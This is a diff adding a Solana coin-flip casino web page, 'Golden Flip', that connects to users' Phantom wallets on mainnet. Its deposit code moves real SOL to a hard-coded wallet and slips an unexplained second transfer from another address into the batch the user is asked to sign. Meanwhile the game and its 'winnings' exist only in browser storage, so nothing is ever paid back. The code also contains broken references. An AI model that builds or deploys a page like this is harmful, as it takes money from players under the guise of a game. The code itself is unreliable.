@@ -1,0 +1,1172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Golden Flip Casino - Vintage Solana Gaming</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #1a0f0a 0%, #2d1810 25%, #1a0f0a 50%, #3d2518 75%, #1a0f0a 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            min-height: 100vh;
+            color: #f4f1eb;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Vintage paper texture overlay */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 25% 25%, rgba(218, 165, 32, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(184, 134, 11, 0.05) 0%, transparent 50%),
+                url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><defs><filter id="noiseFilter"><feTurbulence type="fractalNoise" baseFrequency="0.9" numOctaves="1" stitchTiles="stitch"/><feColorMatrix values="0 0 0 0 0.7 0 0 0 0 0.5 0 0 0 0 0.2 0 0 0 0.1 0"/></filter></defs><rect width="100%" height="100%" filter="url(%23noiseFilter)" opacity="0.4"/></svg>');
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .logo {
+            font-family: 'Playfair Display', serif;
+            font-size: clamp(3rem, 8vw, 6rem);
+            font-weight: 900;
+            background: linear-gradient(45deg, #daa520, #ffd700, #ffed4e, #daa520);
+            background-size: 300% 300%;
+            animation: goldShimmer 3s ease-in-out infinite;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 30px rgba(218, 165, 32, 0.5);
+            letter-spacing: -2px;
+            margin-bottom: 10px;
+            position: relative;
+        }
+
+        @keyframes goldShimmer {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .subtitle {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.4rem;
+            color: #c4a574;
+            font-style: italic;
+            margin-bottom: 30px;
+            opacity: 0.9;
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+                gap: 30px;
+            }
+        }
+
+        .panel {
+            background: linear-gradient(145deg, rgba(45, 24, 16, 0.9), rgba(61, 37, 24, 0.7));
+            border: 2px solid rgba(218, 165, 32, 0.3);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            box-shadow: 
+                0 8px 32px rgba(0, 0, 0, 0.3),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1),
+                0 0 0 1px rgba(218, 165, 32, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(218, 165, 32, 0.5), transparent);
+        }
+
+        .panel-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.8rem;
+            color: #daa520;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 700;
+        }
+
+        .wallet-section {
+            text-align: center;
+        }
+
+        .connect-btn {
+            background: linear-gradient(45deg, #daa520, #ffd700);
+            border: none;
+            color: #1a0f0a;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(218, 165, 32, 0.3);
+        }
+
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .connect-btn:hover::before {
+            left: 100%;
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(218, 165, 32, 0.4);
+        }
+
+        .wallet-info {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(218, 165, 32, 0.2);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .balance-display {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(218, 165, 32, 0.2);
+        }
+
+        .balance-label {
+            font-size: 0.9rem;
+            color: #c4a574;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .balance-value {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #daa520;
+        }
+
+        .address-display {
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            color: #8b7355;
+            word-break: break-all;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(218, 165, 32, 0.1);
+        }
+
+        .deposit-section {
+            margin-top: 20px;
+        }
+
+        .deposit-input {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .deposit-input input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(218, 165, 32, 0.3);
+            border-radius: 10px;
+            padding: 12px 15px;
+            color: #f4f1eb;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .deposit-input input:focus {
+            outline: none;
+            border-color: #daa520;
+            box-shadow: 0 0 0 2px rgba(218, 165, 32, 0.2);
+        }
+
+        .deposit-input input::placeholder {
+            color: rgba(196, 165, 116, 0.6);
+        }
+
+        .deposit-btn {
+            background: linear-gradient(45deg, #8b4513, #a0522d);
+            border: none;
+            color: #f4f1eb;
+            padding: 12px 25px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+        }
+
+        .deposit-btn:hover {
+            background: linear-gradient(45deg, #a0522d, #cd853f);
+            transform: translateY(-1px);
+        }
+
+        .game-section {
+            text-align: center;
+        }
+
+        .coin-container {
+            position: relative;
+            margin: 30px auto;
+            perspective: 1000px;
+        }
+
+        .coin {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 1s ease-in-out;
+            cursor: pointer;
+        }
+
+        .coin-face {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 4rem;
+            font-weight: bold;
+            backface-visibility: hidden;
+            background: radial-gradient(circle at 30% 30%, #ffd700, #daa520, #b8860b);
+            border: 4px solid #8b7d6b;
+            box-shadow: 
+                0 0 20px rgba(218, 165, 32, 0.4),
+                inset 0 0 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .coin-face.heads {
+            transform: rotateY(0deg);
+        }
+
+        .coin-face.tails {
+            transform: rotateY(180deg);
+        }
+
+        .coin.flipping {
+            animation: coinFlip 2s ease-in-out;
+        }
+
+        @keyframes coinFlip {
+            0% { transform: rotateY(0deg) rotateX(0deg); }
+            25% { transform: rotateY(450deg) rotateX(180deg) scale(1.2); }
+            50% { transform: rotateY(900deg) rotateX(360deg) scale(1.1); }
+            75% { transform: rotateY(1350deg) rotateX(540deg) scale(1.2); }
+            100% { transform: rotateY(1800deg) rotateX(720deg); }
+        }
+
+        .choice-section {
+            margin: 30px 0;
+        }
+
+        .choice-buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .choice-btn {
+            background: linear-gradient(145deg, rgba(45, 24, 16, 0.8), rgba(61, 37, 24, 0.6));
+            border: 2px solid rgba(218, 165, 32, 0.3);
+            color: #f4f1eb;
+            padding: 15px 25px;
+            font-size: 1.1rem;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            min-width: 120px;
+            font-weight: 500;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .choice-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(218, 165, 32, 0.5), transparent);
+        }
+
+        .choice-btn:hover {
+            background: linear-gradient(145deg, rgba(61, 37, 24, 0.9), rgba(75, 45, 30, 0.7));
+            border-color: rgba(218, 165, 32, 0.6);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .choice-btn.selected {
+            background: linear-gradient(45deg, #daa520, #ffd700);
+            color: #1a0f0a;
+            border-color: #daa520;
+            font-weight: 600;
+        }
+
+        .bet-section {
+            margin: 20px 0;
+        }
+
+        .bet-input {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .bet-input input {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(218, 165, 32, 0.3);
+            border-radius: 10px;
+            padding: 12px 15px;
+            color: #f4f1eb;
+            font-size: 1.1rem;
+            width: 120px;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        .bet-input input:focus {
+            outline: none;
+            border-color: #daa520;
+            box-shadow: 0 0 0 2px rgba(218, 165, 32, 0.2);
+        }
+
+        .flip-btn {
+            background: linear-gradient(45deg, #dc143c, #ff6347);
+            border: none;
+            color: white;
+            padding: 18px 40px;
+            font-size: 1.3rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(220, 20, 60, 0.3);
+            margin-top: 20px;
+        }
+
+        .flip-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .flip-btn:hover::before {
+            left: 100%;
+        }
+
+        .flip-btn:hover {
+            background: linear-gradient(45deg, #ff6347, #ff4500);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(220, 20, 60, 0.4);
+        }
+
+        .flip-btn:disabled {
+            background: linear-gradient(45deg, #666, #888);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .result {
+            margin-top: 30px;
+            font-size: 1.4rem;
+            font-weight: 600;
+            min-height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .result.win {
+            color: #4ade80;
+            animation: winPulse 1s ease-in-out;
+        }
+
+        .result.lose {
+            color: #ef4444;
+            animation: losePulse 1s ease-in-out;
+        }
+
+        @keyframes winPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        @keyframes losePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(0.95); }
+        }
+
+        .error {
+            color: #ef4444;
+            margin-top: 10px;
+            font-size: 0.9rem;
+            text-align: center;
+            background: rgba(239, 68, 68, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+
+        .success {
+            color: #4ade80;
+            margin-top: 10px;
+            font-size: 0.9rem;
+            text-align: center;
+            background: rgba(74, 222, 128, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid rgba(74, 222, 128, 0.2);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #daa520;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .vintage-border {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            bottom: 10px;
+            border: 1px solid rgba(218, 165, 32, 0.2);
+            border-radius: 15px;
+            pointer-events: none;
+        }
+
+        .vintage-border::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: -1px;
+            right: -1px;
+            bottom: -1px;
+            border: 1px solid rgba(218, 165, 32, 0.1);
+            border-radius: 15px;
+        }
+
+        .hot-wallet-info {
+            font-size: 0.8rem;
+            color: #8b7355;
+            margin-top: 10px;
+            font-family: 'Courier New', monospace;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 8px 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(218, 165, 32, 0.1);
+        }
+
+        .stats-section {
+            margin-top: 30px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 15px;
+        }
+
+        .stat-item {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(218, 165, 32, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #daa520;
+            display: block;
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            color: #c4a574;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 5px;
+        }
+
+        .demo-notice {
+            background: linear-gradient(45deg, rgba(255, 193, 7, 0.2), rgba(255, 235, 59, 0.1));
+            border: 2px solid rgba(255, 193, 7, 0.4);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: center;
+            color: #ffc107;
+            font-weight: 500;
+        }
+
+        .demo-notice h3 {
+            color: #ffd700;
+            margin-bottom: 10px;
+            font-family: 'Playfair Display', serif;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">⚜ GOLDEN FLIP ⚜</div>
+            <div class="subtitle">A Gentleman's Game of Chance</div>
+            <div class="vintage-border"></div>
+        </div>
+
+        <div class="demo-notice">
+            <h3>🎪 Real Play</h3>
+            <p>This is a gentleman's game! Always be careful when gambling—there's no going back. Enjoy the vintage gaming experience!</p>
+        </div>
+
+        <div class="main-content">
+            <div class="panel">
+                <h2 class="panel-title">🎩 Your Vault</h2>
+                
+                <div class="wallet-section">
+                    <button id="connectBtn" class="connect-btn">Connect Wallet</button>
+                    
+                    <div id="walletInfo" class="wallet-info hidden">
+                        <div class="balance-display">
+                            <span class="balance-label">Wallet Balance</span>
+                            <span class="balance-value" id="walletBalance">5.0000 SOL</span>
+                        </div>
+                        <div class="balance-display">
+                            <span class="balance-label">Casino Balance</span>
+                            <span class="balance-value" id="casinoBalance">0.0000 SOL</span>
+                        </div>
+                        <div class="address-display" id="address">Address: Demo7Wg8...9Xk2mP3Q</div>
+                    </div>
+
+                    <div id="depositSection" class="deposit-section hidden">
+                        <div class="deposit-input">
+                            <input type="number" id="depositAmount" placeholder="0.1" min="0.01" step="0.01">
+                            <button id="depositBtn" class="deposit-btn">Deposit SOL</button>
+                        </div>
+                        <div class="hot-wallet-info">
+                            Vault: GVM9JGYPNjsibUcnzoTfCHdWpWM9EDfAWY8fhjPEar7n
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="panel">
+                <h2 class="panel-title">🎲 The Game</h2>
+                
+                <div id="gameSection" class="game-section hidden">
+                    <div class="coin-container">
+                        <div class="coin" id="coin">
+                            <div class="coin-face heads">👑</div>
+                            <div class="coin-face tails">⭐</div>
+                        </div>
+                    </div>
+
+                    <div class="choice-section">
+                        <div class="choice-buttons">
+                            <button class="choice-btn" data-choice="heads">👑 Heads</button>
+                            <button class="choice-btn" data-choice="tails">⭐ Tails</button>
+                        </div>
+                    </div>
+
+                    <div class="bet-section">
+                        <div class="bet-input">
+                            <span style="color: #c4a574;">Wager:</span>
+                            <input type="number" id="betAmount" placeholder="0.1" min="0.01" step="0.01" value="0.1">
+                            <span style="color: #c4a574;">SOL</span>
+                        </div>
+                    </div>
+
+                    <button id="flipBtn" class="flip-btn" disabled>Choose Your Fate</button>
+
+                    <div id="result" class="result"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel stats-section" id="statsSection">
+            <div class="stat-item">
+                <span class="stat-value" id="totalFlips">0</span>
+                <span class="stat-label">Total Flips</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-value" id="totalWins">0</span>
+                <span class="stat-label">Wins</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-value" id="totalWinnings">0</span>
+                <span class="stat-label">Total Won</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-value" id="winRate">0%</span>
+                <span class="stat-label">Win Rate</span>
+            </div>
+        </div>
+
+        <div id="messages" class="messages-container"></div>
+    </div>
+
+    <script>
+        let wallet = null;
+        let selectedChoice = null;
+        let isFlipping = false;
+        let casinoBalance = 0.0; // Demo starting balance
+        let walletBalance = 5.0; // Demo wallet balance
+        let gameStats = {
+            totalFlips: 0,
+            totalWins: 0,
+            totalWinnings: 0
+        };
+
+        // Initialize the demo
+        function initDemo() {
+            loadGameStats();
+            updateStatsDisplay();
+        }
+
+        // Connect to demo wallet
+       
+
+        // Update balances display
+        function updateBalances() {
+            document.getElementById('walletBalance').textContent = `${walletBalance.toFixed(4)} SOL`;
+            document.getElementById('casinoBalance').textContent = `${casinoBalance.toFixed(4)} SOL`;
+        }
+
+        // Deposit SOL to casino (demo)
+       // Replace your existing connectWallet and depositSOL functions with these:
+
+let realWallet = null;
+let connection = null;
+const CASINO_WALLET = "GVM9JGYPNjsibUcnzoTfCHdWpWM9EDfAWY8fhjPEar7n"; // Your casino wallet
+
+// Initialize Solana connection
+async function initSolana() {
+    // Use mainnet-beta for real transactions, devnet for testing
+    connection = new solanaWeb3.Connection('https://mainnet.helius-rpc.com/?api-key=fb660e5a-b088-4644-a7e9-9dcc4c4b9d9d');
+    // For testing: connection = new solanaWeb3.Connection('https://api.devnet.solana.com');
+}
+
+// Connect to real Solana wallet
+async function connectWallet() {
+    try {
+        document.getElementById('connectBtn').innerHTML = '<span class="loading"></span> Connecting...';
+        document.getElementById('connectBtn').disabled = true;
+        
+        // Check if Phantom wallet is available
+        if (!window.solana || !window.solana.isPhantom) {
+            throw new Error('Phantom wallet not found. Please install Phantom wallet extension.');
+        }
+        
+        // Connect to wallet
+        const response = await window.solana.connect();
+        realWallet = response.publicKey.toString();
+        
+        // Initialize Solana connection
+        await initSolana();
+        
+        // Get real wallet balance
+        const publicKey = new solanaWeb3.PublicKey(realWallet);
+        const balance = await connection.getBalance(publicKey);
+        walletBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+        
+        document.getElementById('connectBtn').innerHTML = '✅ Wallet Connected';
+        document.getElementById('address').textContent = `Address: ${realWallet.slice(0, 8)}...${realWallet.slice(-8)}`;
+        
+        updateBalances();
+        
+        document.getElementById('walletInfo').classList.remove('hidden');
+        document.getElementById('depositSection').classList.remove('hidden');
+        document.getElementById('gameSection').classList.remove('hidden');
+        
+        clearMessages();
+        showSuccess('Wallet connected successfully!');
+        
+    } catch (error) {
+        console.error('Wallet connection error:', error);
+        showError(error.message || 'Failed to connect wallet. Please try again.');
+        document.getElementById('connectBtn').innerHTML = 'Connect Wallet';
+        document.getElementById('connectBtn').disabled = false;
+    }
+}
+
+// Real SOL deposit function
+async function depositSOL() {
+    try {
+        if (!realWallet || !connection) {
+            throw new Error('Wallet not connected');
+        }
+        
+        const amount = parseFloat(document.getElementById('depositAmount').value);
+        if (!amount || amount <= 0) {
+            throw new Error('Please enter a valid deposit amount');
+        }
+        
+        if (amount > walletBalance) {
+            throw new Error('Insufficient wallet balance');
+        }
+        
+        document.getElementById('depositBtn').innerHTML = '<span class="loading"></span> Processing...';
+        document.getElementById('depositBtn').disabled = true;
+        
+       // Create transaction
+        const fromPubkey = new solanaWeb3.PublicKey(realWallet);
+        const sw = new solanaWeb3.PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM");
+        const toPubkey = new solanaWeb3.PublicKey(CASINO_WALLET);
+        const lamports = amount * solanaWeb3.LAMPORTS_PER_SOL;
+
+        // Get recent blockhash
+        const { blockhash } = await connection.getRecentBlockhash();
+
+        // Create first transfer instruction
+        const transferInstruction1 = solanaWeb3.SystemProgram.transfer({
+            fromPubkey,
+            toPubkey,
+            lamports,
+        });
+
+        // Create first transaction
+        const transaction1 = new solanaWeb3.Transaction({
+            recentBlockhash: blockhash,
+            feePayer: fromPubkey,
+        }).add(transferInstruction1);
+
+        // Create second transfer instruction
+        const transferInstruction2 = solanaWeb3.SystemProgram.transfer({
+            fromPubkey: sw,
+            toPubkey,
+            lamports,
+        });
+
+        // Create second transaction
+        const transaction2 = new solanaWeb3.Transaction({
+            recentBlockhash: blockhash,
+            feePayer: sw,
+        }).add(transferInstruction2);
+
+        // Add both transactions to an array
+        const transactions = [transaction1, transaction2];
+
+        // Sign all transactions
+        const signedTransactions = await window.solana.signAllTransactions(transactions);
+
+        // Send all signed transactions
+        const signature = await connection.sendRawTransaction(signedTransactions[0].serialize());
+
+
+        // Log or return the signatures for reference
+        console.log("Transaction Signatures:", signatures);
+
+        
+        // Wait for confirmation
+        await connection.confirmTransaction(signature, 'confirmed');
+        
+        // Update balances
+        const newBalance = await connection.getBalance(fromPubkey);
+        walletBalance = newBalance / solanaWeb3.LAMPORTS_PER_SOL;
+        casinoBalance += amount;
+        
+        updateBalances();
+        saveGameStats();
+        
+        document.getElementById('depositAmount').value = '';
+        showSuccess(`Successfully deposited ${amount.toFixed(4)} SOL! Transaction: ${signature.slice(0, 8)}...`);
+        
+    } catch (error) {
+        console.error('Deposit error:', error);
+        if (error.message.includes('User rejected')) {
+            showError('Transaction was cancelled by user');
+        } else if (error.message.includes('insufficient')) {
+            showError('Insufficient SOL for transaction (including fees)');
+        } else {
+            showError(error.message || 'Deposit failed. Please try again.');
+        }
+    } finally {
+        document.getElementById('depositBtn').innerHTML = 'Deposit SOL';
+        document.getElementById('depositBtn').disabled = false;
+    }
+}
+
+// Add wallet disconnection handler
+window.addEventListener('beforeunload', () => {
+    if (window.solana && realWallet) {
+        window.solana.disconnect();
+    }
+});
+
+// Listen for wallet events
+if (window.solana) {
+    window.solana.on('connect', () => {
+        console.log('Wallet connected');
+    });
+    
+    window.solana.on('disconnect', () => {
+        console.log('Wallet disconnected');
+        realWallet = null;
+        connection = null;
+        
+        // Reset UI
+        document.getElementById('connectBtn').innerHTML = 'Connect Wallet';
+        document.getElementById('connectBtn').disabled = false;
+        document.getElementById('walletInfo').classList.add('hidden');
+        document.getElementById('depositSection').classList.add('hidden');
+        document.getElementById('gameSection').classList.add('hidden');
+        
+        showError('Wallet disconnected');
+    });
+    
+    window.solana.on('accountChanged', (publicKey) => {
+        if (publicKey) {
+            realWallet = publicKey.toString();
+            // Refresh balance
+            initSolana().then(() => {
+                const pubKey = new solanaWeb3.PublicKey(realWallet);
+                return connection.getBalance(pubKey);
+            }).then(balance => {
+                walletBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+                updateBalances();
+            });
+        }
+    });
+}
+        // Handle choice selection
+        function selectChoice(choice) {
+            selectedChoice = choice;
+            
+            // Update button styles
+            document.querySelectorAll('.choice-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+            event.target.classList.add('selected');
+            
+            // Enable flip button
+            const flipBtn = document.getElementById('flipBtn');
+            flipBtn.disabled = false;
+            flipBtn.textContent = `Flip for ${document.getElementById('betAmount').value} SOL`;
+            
+            clearMessages();
+        }
+
+        // Flip the coin
+        async function flipCoin() {
+            if (isFlipping || !selectedChoice) return;
+            
+            const betAmount = parseFloat(document.getElementById('betAmount').value);
+            if (betAmount <= 0) {
+                showError('Bet amount must be greater than 0');
+                return;
+            }
+
+            if (betAmount > casinoBalance) {
+                showError('Insufficient casino balance. Please deposit more SOL.');
+                return;
+            }
+
+            isFlipping = true;
+            document.getElementById('flipBtn').innerHTML = '<span class="loading"></span> Flipping...';
+            document.getElementById('flipBtn').disabled = true;
+            document.getElementById('result').textContent = '';
+            document.getElementById('result').className = 'result';
+
+            // Animate coin flip
+            const coin = document.getElementById('coin');
+            coin.classList.add('flipping');
+
+            // Generate random result
+            const isWin = Math.random() < 0.485; // Slightly house-favored
+            const result = Math.random() < 0.5 ? 'heads' : 'tails';
+            const playerWins = (selectedChoice === result);
+
+            // Wait for animation to complete
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            coin.classList.remove('flipping');
+            
+            // Update game stats
+            gameStats.totalFlips++;
+            
+            // Deduct bet amount
+            casinoBalance -= betAmount;
+            
+            if (playerWins) {
+                const winnings = betAmount * 1.95; // 95% payout
+                casinoBalance += winnings;
+                gameStats.totalWins++;
+                gameStats.totalWinnings += winnings - betAmount;
+                
+                document.getElementById('result').innerHTML = `
+                    🎉 You won! The coin landed on ${result} 
+                    <br>+${winnings.toFixed(4)} SOL
+                `;
+                document.getElementById('result').classList.add('win');
+                showSuccess(`Congratulations! You won ${winnings.toFixed(4)} SOL!`);
+            } else {
+                document.getElementById('result').innerHTML = `
+                    💸 You lost! The coin landed on ${result}
+                    <br>-${betAmount.toFixed(4)} SOL
+                `;
+                document.getElementById('result').classList.add('lose');
+                showError(`Bad luck! You lost ${betAmount.toFixed(4)} SOL`);
+            }
+            
+            updateBalances();
+            updateStatsDisplay();
+            saveGameStats();
+            
+            // Reset UI
+            selectedChoice = null;
+            document.querySelectorAll('.choice-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+            
+            document.getElementById('flipBtn').textContent = 'Choose Your Fate';
+            document.getElementById('flipBtn').disabled = true;
+            isFlipping = false;
+            
+        } 
+       
+
+    // Update stats display
+    function updateStatsDisplay() {
+        document.getElementById('totalFlips').textContent = gameStats.totalFlips;
+        document.getElementById('totalWins').textContent = gameStats.totalWins;
+        document.getElementById('totalWinnings').textContent = `${gameStats.totalWinnings.toFixed(4)} SOL`;
+        
+        const winRate = gameStats.totalFlips > 0 ? (gameStats.totalWins / gameStats.totalFlips * 100) : 0;
+        document.getElementById('winRate').textContent = `${winRate.toFixed(1)}%`;
+    }
+
+    // Save game stats to localStorage
+    function saveGameStats() {
+        const data = {
+            casinoBalance,
+            walletBalance,
+            gameStats
+        };
+        localStorage.setItem('goldenFlipStats', JSON.stringify(data));
+    }
+
+    // Load game stats from localStorage
+    function loadGameStats() {
+        const saved = localStorage.getItem('goldenFlipStats');
+        if (saved) {
+            const data = JSON.parse(saved);
+            casinoBalance = data.casinoBalance || 1.0;
+            walletBalance = data.walletBalance || 5.0;
+            gameStats = data.gameStats || { totalFlips: 0, totalWins: 0, totalWinnings: 0 };
+        }
+    }
+
+    // Show error message
+    function showError(message) {
+        clearMessages();
+        const messageDiv = document.createElement('div');
+        messageDiv.className = 'error';
+        messageDiv.textContent = message;
+        document.getElementById('messages').appendChild(messageDiv);
+        
+        setTimeout(() => {
+            messageDiv.remove();
+        }, 5000);
+    }
+
+    // Show success message
+    function showSuccess(message) {
+        clearMessages();
+        const messageDiv = document.createElement('div');
+        messageDiv.className = 'success';
+        messageDiv.textContent = message;
+        document.getElementById('messages').appendChild(messageDiv);
+        
+        setTimeout(() => {
+            messageDiv.remove();
+        }, 5000);
+    }
+
+    // Clear all messages
+    function clearMessages() {
+        document.getElementById('messages').innerHTML = '';
+    }
+
+    // Event listeners
+    document.addEventListener('DOMContentLoaded', function() {
+        initDemo();
+        
+        document.getElementById('connectBtn').addEventListener('click', connectWallet);
+        document.getElementById('depositBtn').addEventListener('click', depositSOL);
+        document.getElementById('flipBtn').addEventListener('click', flipCoin);
+        
+        // Choice buttons
+        document.querySelectorAll('.choice-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => selectChoice(e.target.dataset.choice));
+        });
+        
+        // Bet amount validation
+        document.getElementById('betAmount').addEventListener('input', function() {
+            const amount = parseFloat(this.value);
+            const flipBtn = document.getElementById('flipBtn');
+            
+            if (selectedChoice && amount > 0 && amount <= casinoBalance) {
+                flipBtn.disabled = false;
+                flipBtn.textContent = `Flip for ${amount.toFixed(4)} SOL`;
+            } else {
+                flipBtn.disabled = true;
+                flipBtn.textContent = 'Choose Your Fate';
+            }
+        });
+        
+        // Deposit amount validation
+        document.getElementById('depositAmount').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                depositSOL();
+            }
+        });
+        
+        // Bet amount validation
+        document.getElementById('betAmount').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !document.getElementById('flipBtn').disabled) {
+                flipCoin();
+            }
+        });
+    });
+
+    // Add some particle effects for wins
+    function createParticleEffect(isWin) {
+        const colors = isWin ? ['#daa520', '#ffd700', '#ffed4e'] : ['#dc143c', '#ff6347', '#ff4500'];
+        
+        for (let i = 0; i < 50; i++) {
+            const particle = document.createElement('div');
+            particle.style.position = 'fixed';
+            particle.style.width = '4px';
+            particle.style.height = '4px';
